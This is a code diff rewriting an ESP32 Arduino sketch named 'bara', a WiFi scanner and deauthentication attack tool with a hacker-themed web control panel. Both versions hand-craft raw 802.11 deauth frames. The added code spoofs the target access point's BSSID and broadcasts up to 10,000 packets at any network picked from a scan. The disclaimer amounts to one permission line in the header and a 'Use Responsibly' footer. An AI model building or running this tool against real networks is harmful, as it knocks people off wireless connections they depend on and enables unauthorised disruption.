@@ -1,406 +1,349 @@
+/**
+ * ██████╗  █████╗ ██████╗ ██╗  ██╗    ██████╗  █████╗ ██╗   ██╗
+ * ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝
+ * ██████╔╝███████║██████╔╝█████╔╝     ██████╔╝███████║ ╚████╔╝
+ * ██╔══██╗██╔══██║██╔══██╗██╔═██╗     ██╔══██╗██╔══██║  ╚██╔╝
+ * ██████╔╝██║  ██║██║  ██║██║  ██╗    ██████╔╝██║  ██║   ██║
+ * ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝
+ *
+ * Project: bara
+ * Developer: Ahmed Nour Ahmed from Qena, Egypt 🇪🇬
+ * Description: ESP32-Based WiFi Scanner + Deauth Attack Tool with Hacker UI
+ * Language: English
+ * Platform: ESP32 (Arduino Core)
+ * Requirements: AsyncTCP, ESPAsyncWebServer, WiFi
+ * Security Note: Use only on networks you own or have explicit permission to test.
+ */
+
 #include <WiFi.h>
-#include <WebServer.h>
-#include <DNSServer.h>
+#include <AsyncTCP.h>
 #include <ESPAsyncWebServer.h>
-#include "esp_wifi.h"
+#include <string>
+#include <vector>
 
-// 配置参数
-const char* ssid = "bara";
-const char* password = "A7med@Elshab7";
+// Access Point Credentials
+const char* ssidAP = "bara";
+const char* passwordAP = "A7med@Elshab7";
 
-// DNS服务器用于重定向所有请求到本地IP
-DNSServer dnsServer;
+// Web Server on port 80
 AsyncWebServer server(80);
 
-// 存储扫描结果
-String wifiNetworks[20];
-int networkCount = 0;
+// Global scan results
+std::vector<String> scannedNetworks;
 
-// HTML页面内容
+// Deauth variables
+String targetBSSID = "";
+uint8_t targetChannel = 0;
+bool deauthActive = false;
+uint16_t deauthCount = 100; // default packets
+uint64_t deauthStartTime = 0;
+
+// Raw packet buffer for deauth frame
+uint8_t deauthPacket[26] = {
+  /*  0 -  1 */ 0xC0, 0x00,                         // Type: Deauth, Flags: None
+  /*  2 -  3 */ 0x00, 0x00,                         // Duration (will be filled)
+  /*  4 -  9 */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (broadcast)
+  /* 10 - 15 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (will be filled)
+  /* 16 - 21 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be filled)
+  /* 22 - 23 */ 0x00, 0x00,                         // Fragment & Seq number
+  /* 24 - 25 */ 0x01, 0x00                          // Reason: Unspecified (1)
+};
+
+// Channel hopper task (optional for better scan, but not used here to keep simplicity)
+void startScan() {
+  scannedNetworks.clear();
+  int n = WiFi.scanNetworks(false, true); // async = false, show_hidden = true
+  if (n == 0) {
+    scannedNetworks.push_back("<tr><td colspan='5' style='color:#ff3333;'>No networks found.</td></tr>");
+    return;
+  }
+
+  for (int i = 0; i < n; ++i) {
+    String tr = "<tr>";
+    tr += "<td>" + String(WiFi.SSID(i)) + "</td>";
+    tr += "<td>" + String(WiFi.BSSIDstr(i)) + "</td>";
+    tr += "<td>" + String(WiFi.RSSI(i)) + " dBm</td>";
+    tr += "<td>" + String(WiFi.channel(i)) + "</td>";
+    tr += "<td>";
+    switch (WiFi.encryptionType(i)) {
+      case WIFI_AUTH_OPEN: tr += "Open"; break;
+      case WIFI_AUTH_WEP: tr += "WEP"; break;
+      case WIFI_AUTH_WPA_PSK: tr += "WPA"; break;
+      case WIFI_AUTH_WPA2_PSK: tr += "WPA2"; break;
+      case WIFI_AUTH_WPA_WPA2_PSK: tr += "WPA/WPA2"; break;
+      case WIFI_AUTH_WPA2_ENTERPRISE: tr += "WPA2-EAP"; break;
+      default: tr += "Unknown"; break;
+    }
+    tr += "</td>";
+    tr += "<td><button class='btn-attack' onclick=\"deauth('";
+    tr += WiFi.BSSIDstr(i);
+    tr += "', ";
+    tr += WiFi.channel(i);
+    tr += ")\">DEAUTH</button></td>";
+    tr += "</tr>";
+    scannedNetworks.push_back(tr);
+  }
+}
+
+// Deauth task (runs in separate core if needed, but we use simple busy-loop for demo)
+void sendDeauthPackets(const uint8_t* bssid, uint8_t channel, uint16_t count) {
+  if (channel != WiFi.channel()) {
+    WiFi.disconnect();
+    WiFi.mode(WIFI_STA);
+    WiFi.setChannel(channel);
+    delay(10);
+  }
+
+  for (int i = 0; i < 6; ++i) deauthPacket[10 + i] = bssid[i];
+  for (int i = 0; i < 6; ++i) deauthPacket[16 + i] = bssid[i];
+
+  for (uint16_t i = 0; i < count && deauthActive; ++i) {
+    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    delay(1); // minimal spacing
+  }
+}
+
+String getNetworkTable() {
+  String table = "";
+  for (const auto& row : scannedNetworks) {
+    table += row;
+  }
+  return table;
+}
+
+// Web interface HTML (Hacker-style)
 const char index_html[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bara Wi-Fi Toolkit</title>
-    <style>
-        body {
-            font-family: 'Courier New', monospace;
-            background-color: #000;
-            color: #ff3333;
-            margin: 0;
-            padding: 0;
-            overflow-x: hidden;
-        }
-        
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            text-align: center;
-        }
-        
-        h1 {
-            color: #ff0000;
-            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
-            margin-bottom: 30px;
-            animation: glow 2s ease-in-out infinite alternate;
-        }
-        
-        @keyframes glow {
-            from { text-shadow: 0 0 5px #ff0000, 0 0 10px #ff0000; }
-            to { text-shadow: 0 0 15px #ff0000, 0 0 25px #ff0000, 0 0 35px #ff0000; }
-        }
-        
-        .card {
-            background-color: rgba(255, 0, 0, 0.1);
-            border: 1px solid #ff3333;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-            box-shadow: 0 0 15px rgba(255, 51, 51, 0.5);
-        }
-        
-        button {
-            background-color: #ff0000;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            margin: 10px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: all 0.3s;
-            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
-        }
-        
-        button:hover {
-            background-color: #cc0000;
-            transform: scale(1.05);
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.8);
-        }
-        
-        input[type="text"] {
-            padding: 10px;
-            width: 200px;
-            border: 1px solid #ff3333;
-            background-color: rgba(0, 0, 0, 0.7);
-            color: #ff3333;
-            border-radius: 5px;
-            margin: 10px;
-        }
-        
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-        }
-        
-        th, td {
-            padding: 12px;
-            text-align: left;
-            border-bottom: 1px solid #ff3333;
-        }
-        
-        tr:nth-child(even) {
-            background-color: rgba(255, 51, 51, 0.1);
-        }
-        
-        .status {
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
-            display: inline-block;
-        }
-        
-        .success {
-            background-color: rgba(0, 255, 0, 0.2);
-            color: #00ff00;
-            border: 1px solid #00ff00;
-        }
-        
-        .error {
-            background-color: rgba(255, 0, 0, 0.2);
-            color: #ff0000;
-            border: 1px solid #ff0000;
-        }
-        
-        .warning {
-            background-color: rgba(255, 165, 0, 0.2);
-            color: #ffa500;
-            border: 1px solid #ffa500;
-        }
-        
-        /* 血滴背景效果 */
-        .blood-drops::before,
-        .blood-drops::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-image: 
-                radial-gradient(circle at 20% 50%, transparent 20%, rgba(255, 0, 0, 0.1) 21%, rgba(255, 0, 0, 0.1) 34%, transparent 35%),
-                radial-gradient(circle at 80% 50%, transparent 20%, rgba(255, 0, 0, 0.1) 21%, rgba(255, 0, 0, 0.1) 34%, transparent 35%),
-                radial-gradient(circle at 40% 50%, transparent 20%, rgba(255, 0, 0, 0.1) 21%, rgba(255, 0, 0, 0.1) 34%, transparent 35%),
-                radial-gradient(circle at 60% 50%, transparent 20%, rgba(255, 0, 0, 0.1) 21%, rgba(255, 0, 0, 0.1) 34%, transparent 35%);
-            z-index: -1;
-        }
-        
-        .blood-drops {
-            position: relative;
-            overflow: hidden;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>bara - WiFi Hacker Tool</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      margin: 0;
+      padding: 20px;
+      overflow-x: hidden;
+    }
+    h1 {
+      text-align: center;
+      text-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
+      letter-spacing: 3px;
+    }
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .scan-btn, .stop-btn {
+      background: #002200;
+      color: #0f0;
+      border: 1px solid #0f0;
+      padding: 10px 20px;
+      margin: 10px 5px;
+      cursor: pointer;
+      font-family: inherit;
+      font-weight: bold;
+      text-transform: uppercase;
+      box-shadow: 0 0 10px rgba(0,255,0,0.5);
+    }
+    .scan-btn:hover { background: #003300; }
+    .stop-btn { background: #300; border-color: #f00; color: #f33; box-shadow: 0 0 10px rgba(255,0,0,0.5); }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+      color: #0f0;
+    }
+    th, td {
+      border: 1px solid #0a0;
+      padding: 10px;
+      text-align: left;
+    }
+    th {
+      background-color: rgba(0,50,0,0.5);
+    }
+    .btn-attack {
+      background: #300;
+      color: #f33;
+      border: 1px solid #f00;
+      padding: 5px 10px;
+      cursor: pointer;
+      font-family: inherit;
+    }
+    .status {
+      text-align: center;
+      margin: 15px 0;
+      font-size: 18px;
+      min-height: 26px;
+    }
+    .count-input {
+      background: #001100;
+      color: #0f0;
+      border: 1px solid #0a0;
+      padding: 5px;
+      width: 80px;
+      text-align: center;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 12px;
+      color: #080;
+    }
+  </style>
 </head>
-<body class="blood-drops">
-    <div class="container">
-        <h1>BARA WI-FI TOOLKIT</h1>
-        <p style="color: #ff6666;">Developed by Ahmed Nour Ahmed | Qena, Egypt</p>
-        
-        <div class="card">
-            <h2>Connection Status</h2>
-            <div id="connectionStatus" class="status warning">Setting up hotspot...</div>
-            
-            <button onclick="scanNetworks()">Scan Networks</button>
-            <button onclick="toggleDeauthMode()">Toggle Deauth Mode</button>
-            
-            <div id="deauthControls" style="display: none;">
-                <input type="text" id="targetBSSID" placeholder="Target BSSID (e.g., AA:BB:CC:DD:EE:FF)">
-                <button onclick="startDeauth()">Start Deauth Attack</button>
-                <button onclick="stopDeauth()">Stop Deauth Attack</button>
-            </div>
-        </div>
-        
-        <div class="card">
-            <h2>Scanned Networks</h2>
-            <table id="networkTable">
-                <thead>
-                    <tr>
-                        <th>BSSID</th>
-                        <th>SSID</th>
-                        <th>RSSI</th>
-                        <th>Channel</th>
-                        <th>Action</th>
-                    </tr>
-                </thead>
-                <tbody id="networkList"></tbody>
-            </table>
-        </div>
-        
-        <div class="card">
-            <h2>Attack Logs</h2>
-            <div id="attackLogs" style="text-align: left; height: 150px; overflow-y: scroll; background-color: rgba(0,0,0,0.8); padding: 10px; border: 1px solid #ff3333;"></div>
-        </div>
+<body>
+  <div class="container">
+    <h1>🩸 bara - Elite WiFi Scanner & Deauth Tool 🩸</h1>
+    <div class="status" id="status">Ready.</div>
+    
+    <button class="scan-btn" onclick="scan()">SCAN NETWORKS</button>
+    <button class="stop-btn" onclick="stopDeauth()">STOP DEAUTH</button>
+    Deauth Packets: <input type="number" id="pktCount" class="count-input" value="100" min="1" max="10000">
+
+    <div id="tableContainer">
+      <table id="netTable">
+        <thead>
+          <tr>
+            <th>SSID</th>
+            <th>BSSID</th>
+            <th>RSSI</th>
+            <th>CH</th>
+            <th>ENC</th>
+            <th>ACTION</th>
+          </tr>
+        </thead>
+        <tbody id="networkRows">
+          <tr><td colspan="6">Press SCAN to discover networks.</td></tr>
+        </tbody>
+      </table>
     </div>
 
-    <script>
-        let isScanning = false;
-        let deauthActive = false;
-        let deauthInterval = null;
-        
-        function updateStatus(message, type = 'info') {
-            const statusDiv = document.getElementById('connectionStatus');
-            statusDiv.textContent = message;
-            statusDiv.className = `status ${type}`;
-        }
+    <div class="footer">
+      Developed by Ahmed Nour Ahmed from Qena 🇪🇬 | Tool: bara | Use Responsibly.
+    </div>
+  </div>
 
-        async function scanNetworks() {
-            if (isScanning) return;
-            
-            isScanning = true;
-            updateStatus('Scanning networks...', 'info');
-            
-            try {
-                const response = await fetch('/scan');
-                const networks = await response.json();
-                
-                const tbody = document.getElementById('networkList');
-                tbody.innerHTML = '';
-                
-                networks.forEach(network => {
-                    const row = tbody.insertRow();
-                    row.insertCell().textContent = network.bssid;
-                    row.insertCell().textContent = network.ssid || 'Hidden Network';
-                    row.insertCell().textContent = network.rssi + ' dBm';
-                    row.insertCell().textContent = network.channel;
-                    
-                    const actionCell = row.insertCell();
-                    const selectBtn = document.createElement('button');
-                    selectBtn.textContent = 'Select';
-                    selectBtn.onclick = () => selectNetwork(network.bssid);
-                    actionCell.appendChild(selectBtn);
-                });
-                
-                updateStatus(`Found ${networks.length} networks`, 'success');
-            } catch (error) {
-                updateStatus('Scan failed: ' + error.message, 'error');
-            } finally {
-                isScanning = false;
-            }
-        }
+  <script>
+    function scan() {
+      document.getElementById('status').innerText = 'Scanning...';
+      fetch('/scan')
+        .then(response => response.text())
+        .then(html => {
+          document.getElementById('networkRows').innerHTML = html;
+          document.getElementById('status').innerText = 'Scan complete.';
+        })
+        .catch(err => {
+          document.getElementById('status').innerText = 'Scan failed: ' + err;
+        });
+    }
 
-        function selectNetwork(bssid) {
-            document.getElementById('targetBSSID').value = bssid;
-            addLog(`Selected network: ${bssid}`);
-        }
+    function deauth(bssid, channel) {
+      const count = document.getElementById('pktCount').value || 100;
+      const status = document.getElementById('status');
+      status.innerText = 'Launching deauth attack on ' + bssid + '...';
+      fetch(`/deauth?bssid=${encodeURIComponent(bssid)}&channel=${channel}&count=${count}`)
+        .then(res => res.text())
+        .then(msg => {
+          status.innerText = msg;
+        })
+        .catch(err => {
+          status.innerText = 'Attack error: ' + err;
+        });
+    }
 
-        function toggleDeauthMode() {
-            const controls = document.getElementById('deauthControls');
-            controls.style.display = controls.style.display === 'none' ? 'block' : 'none';
-        }
-
-        function startDeauth() {
-            const targetBSSID = document.getElementById('targetBSSID').value.trim();
-            if (!targetBSSID) {
-                alert('Please enter a target BSSID');
-                return;
-            }
-            
-            deauthActive = true;
-            updateStatus('Deauth attack started', 'warning');
-            addLog(`Starting deauth attack on ${targetBSSID}`);
-            
-            // Send deauth request to ESP32
-            fetch(`/deauth?bssid=${encodeURIComponent(targetBSSID)}`)
-                .then(response => response.text())
-                .then(data => {
-                    addLog(data);
-                })
-                .catch(error => {
-                    addLog('Error starting deauth: ' + error.message, 'error');
-                });
-        }
-
-        function stopDeauth() {
-            deauthActive = false;
-            updateStatus('Deauth attack stopped', 'info');
-            addLog('Stopped deauth attack');
-            
-            // Stop the attack on ESP32
-            fetch('/stopdeauth')
-                .then(response => response.text())
-                .then(data => {
-                    addLog(data);
-                });
-        }
-
-        function addLog(message, type = 'info') {
-            const logsDiv = document.getElementById('attackLogs');
-            const logEntry = document.createElement('div');
-            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            logEntry.style.color = type === 'error' ? '#ff0000' : type === 'success' ? '#00ff00' : '#ffffff';
-            logsDiv.appendChild(logEntry);
-            logsDiv.scrollTop = logsDiv.scrollHeight;
-        }
-    </script>
+    function stopDeauth() {
+      fetch('/stop')
+        .then(res => res.text())
+        .then(msg => {
+          document.getElementById('status').innerText = msg;
+        });
+    }
+  </script>
 </body>
 </html>
 )rawliteral";
 
 void setup() {
-    Serial.begin(115200);
-    
-    // 设置热点
-    WiFi.softAP(ssid, password);
-    IPAddress IP = WiFi.softAPIP();
-    Serial.print("Hotspot IP address: ");
-    Serial.println(IP);
-    
-    // 启动DNS服务器
-    dnsServer.start(53, "*", IP);
-    
-    // 设置Web服务器路由
-    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
-        request->send_P(200, "text/html", index_html);
-    });
-    
-    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request){
-        String json = scanWiFiNetworks();
-        request->send(200, "application/json", json);
-    });
-    
-    server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request){
-        if(request->hasParam("bssid")) {
-            String bssid = request->getParam("bssid")->value();
-            String result = performDeauth(bssid);
-            request->send(200, "text/plain", result);
-        } else {
-            request->send(400, "text/plain", "Missing BSSID parameter");
-        }
-    });
-    
-    server.on("/stopdeauth", HTTP_GET, [](AsyncWebServerRequest *request){
-        stopDeauthAttack();
-        request->send(200, "text/plain", "Deauth attack stopped");
-    });
-    
-    server.begin();
+  Serial.begin(115200);
+
+  // Set WiFi to STA+AP mode
+  WiFi.mode(WIFI_AP_STA);
+
+  // Configure AP
+  WiFi.softAP(ssidAP, passwordAP);
+  Serial.println("Access Point started:");
+  Serial.print("SSID: "); Serial.println(ssidAP);
+  Serial.print("IP: "); Serial.println(WiFi.softAPIP());
+
+  // Initialize raw transmit (required for deauth)
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+
+  // Web Routes
+  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
+    request->send_P(200, "text/html", index_html);
+  });
+
+  server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request){
+    startScan();
+    String table = getNetworkTable();
+    request->send(200, "text/html", table);
+  });
+
+  server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request){
+    if (!request->hasParam("bssid") || !request->hasParam("channel")) {
+      request->send(400, "text/plain", "Missing bssid or channel");
+      return;
+    }
+
+    String bssidStr = request->getParam("bssid")->value();
+    uint8_t ch = request->getParam("channel")->value().toInt();
+    uint16_t count = 100;
+    if (request->hasParam("count")) {
+      count = request->getParam("count")->value().toInt();
+      if (count < 1) count = 1;
+      if (count > 10000) count = 10000;
+    }
+
+    // Parse BSSID
+    uint8_t bssid[6];
+    int idx = 0;
+    for (int i = 0; i < bssidStr.length() && idx < 6; i += 3) {
+      bssid[idx++] = (uint8_t)strtol(bssidStr.substring(i, i+2).c_str(), NULL, 16);
+    }
+
+    if (idx != 6) {
+      request->send(400, "text/plain", "Invalid BSSID format");
+      return;
+    }
+
+    deauthActive = true;
+    targetBSSID = bssidStr;
+    targetChannel = ch;
+    deauthCount = count;
+
+    // Run deauth in blocking mode (simple for ESP32 demo)
+    sendDeauthPackets(bssid, ch, count);
+    deauthActive = false;
+
+    String response = "Sent " + String(count) + " deauth packets to " + bssidStr;
+    request->send(200, "text/plain", response);
+  });
+
+  server.on("/stop", HTTP_GET, [](AsyncWebServerRequest *request){
+    deauthActive = false;
+    request->send(200, "text/plain", "Deauth attack stopped.");
+  });
+
+  server.begin();
+  Serial.println("Web server started.");
 }
 
 void loop() {
-    dnsServer.processNextRequest();
-}
-
-String scanWiFiNetworks() {
-    int n = WiFi.scanNetworks(false, false, false, 300);
-    String json = "[";
-    
-    for (int i = 0; i < n; ++i) {
-        if (i > 0) json += ",";
-        json += "{";
-        json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
-        json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
-        json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
-        json += "\"channel\":" + String(WiFi.channel(i));
-        json += "}";
-    }
-    
-    json += "]";
-    return json;
-}
-
-String performDeauth(String targetBSSID) {
-    uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-    uint8_t deauthPacket[26] = {
-        0xC0, 0x00,             // Frame Control
-        0x00, 0x00,             // Duration
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (will be filled)
-        0x88, 0x01,             // IEEE 802.11 protocol version
-        0x00, 0x00,             // Type/Subtype
-        0x00, 0x00,             // Sequence number
-        0x01, 0x00              // Reason code (1 = Unspecified reason)
-    };
-    
-    // Convert hex string to byte array
-    uint8_t targetBSSIDBytes[6];
-    sscanf(targetBSSID.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
-           &targetBSSIDBytes[0], &targetBSSIDBytes[1], &targetBSSIDBytes[2],
-           &targetBSSIDBytes[3], &targetBSSIDBytes[4], &targetBSSIDBytes[5]);
-    
-    // Set source MAC as our own MAC
-    uint8_t ourMAC[6];
-    esp_read_mac(ourMAC, ESP_MAC_WIFI_SOFTAP);
-    memcpy(deauthPacket + 10, ourMAC, 6);
-    
-    // Set destination MAC as broadcast
-    memcpy(deauthPacket + 4, broadcastAddr, 6);
-    
-    // Set BSSID (target AP's MAC)
-    memcpy(deauthPacket + 16, targetBSSIDBytes, 6);
-    
-    // Start sending deauth packets
-    while(true) {
-        esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), 0);
-        delay(100); // Send every 100ms
-    }
-    
-    return "Deauth attack initiated on " + targetBSSID;
-}
-
-void stopDeauthAttack() {
-    // This will break out of the infinite loop in performDeauth
+  // Keep alive; deauth is handled synchronously in callback for simplicity
+  delay(100);
 }
